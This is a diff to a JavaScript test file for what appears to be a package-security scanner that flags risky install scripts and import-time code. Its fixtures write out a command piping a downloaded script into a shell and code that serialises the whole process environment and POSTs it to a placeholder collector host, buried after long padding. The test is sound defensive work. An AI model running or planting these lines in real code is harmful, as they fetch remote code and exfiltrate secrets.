@@ -40,8 +40,9 @@ test("inputs of millions of characters: the results are core's", () => {
     () => fill("env ", "", "node x.js"), () => fill("a\\ ")])
     assert.deepEqual(followHook(make()), [[], false]);
   assert.deepEqual(installScriptRisk(fill("curl -s https://files.invalid/x.sh | sh; ")), ["pipes a download into a shell"]);
-  const huge = fill("const e = JSON.stringify(process.env);\n", "",
-    "fetch('https://collector.invalid/c', { method: 'POST', body: e });\n");   // (0.1.8: the line that sends it)
+  // (0.1.8: the line that sends it, after millions of characters of calls)
+  const huge = fill("pad();\n", "",
+    "const e = JSON.stringify(process.env);\nfetch('https://collector.invalid/c', { method: 'POST', body: e });\n");
   assert.deepEqual(importTimeRisk(huge),
     [["reads credentials or the whole environment and sends data over the network"], huge.split("\n").length - 1]);
 });
